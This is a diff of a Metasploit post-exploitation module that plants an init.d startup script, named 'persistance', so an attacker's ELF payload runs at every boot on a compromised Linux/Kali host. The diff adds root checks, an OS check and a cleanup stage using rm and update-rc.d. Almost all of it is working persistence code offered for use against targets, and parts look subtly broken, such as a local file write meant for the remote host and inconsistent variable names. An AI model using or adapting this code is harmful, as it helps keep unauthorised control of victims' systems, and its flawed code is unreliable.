@@ -13,10 +13,12 @@
 #
 #
 # [ DESCRIPTION ]
-# Builds 'persist' init.d startup script that allow users to persiste
+# Builds 'persistance' init.d startup script that allow users to persiste
 # your elf binary (linux executable) on Linux Kali distros at every startup
 # This post-exploitation module requires the payload allready deployed
 # in target system and root privileges (in non-Kali distros).
+# HINT: In Kali distos we are 'root' by default, so this post module does
+# not required privilege escalation in systems were we are allread root ..
 #
 #
 # [ MODULE OPTIONS ]
@@ -60,7 +62,6 @@
 require 'rex'
 require 'msf/core'
 require 'msf/core/post/common'
-require 'msf/core/post/linux/priv'
 
 
 
@@ -74,7 +75,6 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Linux::Priv
   include Msf::Post::Linux::System
-  include Msf::Exploit::FILEFORMAT
 
 
 
@@ -83,9 +83,9 @@ class MetasploitModule < Msf::Post
 # -----------------------------------------
         def initialize(info={})
                 super(update_info(info,
-                        'Name'          => 'Kali binary[elf] init.d persistence module',
+                        'Name'          => 'Linux Kali 2.0 init.d persistence post-module',
                         'Description'   => %q{
-                                        Builds 'persist' init.d startup script that allow users to persiste your elf binary (linux executable) on Linux Kali distros at every startup. This post-exploitation module requires the payload allready deployed in target system and root privileges (in non-Kali distros).
+                                        Builds 'persistance' init.d startup script that allow users to persiste your elf binary (linux executables) on Linux Kali 2.0 distros at every startup. This post-exploitation module requires the payload allready deployed in target system and root privileges active (in non-Kali distros).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -93,14 +93,13 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.0',
-                        'DisclosureDate' => 'mai 30 2017',
+                        'Version'        => '$Revision: 1.1',
+                        'DisclosureDate' => 'mai 31 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
-                        'Privileged'     => 'false',   # thats no need for privilege escalation..
+                        'Privileged'     => 'false',   # thats no need for privilege escalation (kali) ..
                         'Targets'        =>
                                 [
-                                         # Tested againts windows 7 | Windows 10
                                          [ 'Linux Kali' ]
                                 ],
                         'DefaultTarget'  => '1', # default its to run againts Kali 2.0
@@ -144,31 +143,32 @@ class MetasploitModule < Msf::Post
 def ls_stage1
 
   session = client
-  init_check = datastore['INIT_PATH']    # /etc/init.d
-  remote_path = datastore['REMOTE_PATH'] # /root/payload
-  script_check = "#{init_check}/persist" # /etc/init.d/persist
+  init_check = datastore['INIT_PATH']        # /etc/init.d
+  remote_path = datastore['REMOTE_PATH']     # /root/payload
+  script_check = "#{init_check}/persistance" # /etc/init.d/persistance
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
   #
   if datastore['REMOTE_PATH'] == 'nil'
     vprint_error("Options not configurated correctly ..")
-    vprint_warning("Please set REMOTE_PATH options!")
+    vprint_warning("Please set REMOTE_PATH option!")
     return nil
   else
-    vprint_status("Persisting: #{remote_path} agent ..")
+    vprint_status("Persist: #{remote_path} agent ..")
     Rex::sleep(1.0)
   end
 
     #
-    # Check if agent its deployed in target system ..
+    # Check if agent its deployed (remote) ..
     #
     if not session.fs.file.exist?(remote_path)
       vprint_error("%red" + "agent: #{remote_path} not found ..")
+      vprint_error("Please upload your agent before running this module ..")
       return nil
     end
     #
-    # Check init.d directory existance ..
+    # Check init.d directory existance (remote)..
     #
     if not session.fs.directory.exist?(init_check)
       vprint_error("%red" + "path: #{init_check} not found ..")
@@ -180,8 +180,8 @@ def ls_stage1
       #
       vprint_warning("writing init.d startup script ..")
       Rex::sleep(1.0)
-      vprint_good("remote path: #{init_check}/persist")
-      File.open("#{init_check}/persist", "w+") do |f|
+      vprint_good("remote path: #{init_check}/persistance")
+      File.open("#{init_check}/persistance", "w+") do |f|
         f.write("#!/bin/sh")
         f.write("### BEGIN INIT INFO")
         f.write("# Provides:          persistence on kali")
@@ -201,12 +201,12 @@ def ls_stage1
       # Config init.d startup service (chmod + update-rc.d)
       #
       if session.fs.file.exist?(script_check)
-        vprint_status("Config init.d persistence script ..")
+        vprint_good("Config init.d persistence script ..")
         Rex::sleep(1.0)
         cmd_exec("chmod +x #{script_check}")
-        vprint_status("Update init.d service status ..")
+        vprint_good("Update init.d service status ..")
         Rex::sleep(1.0)
-        cmd_exec("update-rc.d persist defaults # 97 03")
+        cmd_exec("update-rc.d persistance defaults # 97 03")
       else
         vprint_error("%red" + "init.d script: #{script_check} not found ..")
         return nil
@@ -215,7 +215,7 @@ def ls_stage1
     #
     # Final displays to user ..
     #
-    vprint_status("persistence activated on remote system ..")
+    vprint_good("persistence activated on remote system ..")
     vprint_status("agent to exec: #{remote_path}")
     vprint_status("init.d script: #{script_check}")
     vprint_line("")
@@ -238,8 +238,8 @@ end
 def ls_stage2
 
   session = client
-  init_check = datastore['INIT_PATH']    # /etc/init.d
-  script_check = "#{init_check}/persist" # /etc/init.d/persist
+  init_check = datastore['INIT_PATH']        # /etc/init.d
+  script_check = "#{init_check}/persistance" # /etc/init.d/persistance
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
@@ -261,10 +261,33 @@ def ls_stage2
       return nil
     end
 
-  # not yet writen 
-  vprint_warning("%yeloow" + "Funtion not yet writen ..")
-  Rex::sleep(1.0)
-  return nil
+      #
+      # Delete init.d script ..
+      #
+      vprint_status("remove script from init.d directory ..")
+      Rex::sleep(1.0)
+      cmd_exec("rm -f #{init_check}/persistance")
+      vprint_status("Delete persistence service (symlinks) ..")
+      cmd_exec("update-rc.d persistance remove")
+      Rex::sleep(1.5)
+
+
+    #
+    # Check init.d persiste script existance ..
+    #
+    if session.fs.file.exist?(script_check)
+      vprint_error("%red" + "script: #{script_check} not proper deleted ..")
+      vprint_error("Please manually delete : rm -f #{init_check}/persistance")
+      vprint_error("Please manually execute: update-rc.d persistance remove")
+      return nil
+    end
+
+
+  #
+  # error exception funtion
+  #
+  rescue ::Exception => e
+  vprint_error("Error: #{e.class} #{e}")
 end
 
 
@@ -279,6 +302,7 @@ def run
   session = client
 
       # Variable declarations (msf API calls)
+      # distro = get_sysinfo
       sysnfo = session.sys.config.sysinfo
       runtor = client.sys.config.getuid
       runsession = client.session_host
@@ -305,13 +329,27 @@ def run
     # the 'def check()' funtion that rapid7 requires to accept new modules.
     # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
+    # check for proper operative system (Linux Kali)
+    # if not distro =~ /Kali/
+    if not sysinfo['OS'] =~ /Linux/
+      vprint_error("[ ABORT ]: This module only works againt Linux systems")
+      return nil
+    end
+    #
+    # Check if we are running in an higth integrity context ..
+    #
+    unless is_root?
+      vprint_error("[ ABORT ]: Root access is required ..")
+      return nil
+    end
+    #
     # check for proper session (meterpreter)
-    # the non-return of sysinfo command reveals
-    # that we are not on a meterpreter session!
+    # the non-return of sysinfo command reveals that we are not on a meterpreter session!
+    #
     if not sysinfo.nil?
-      print_status("Running module against: #{sysnfo['Computer']}")
+      vprint_status("Running module against: #{sysnfo['Computer']}")
     else
-      print_error("[ ABORT ]: This module only works against meterpreter sessions!")
+      vprint_error("[ ABORT ]: This module only works against meterpreter sessions!")
       return nil
     end
 
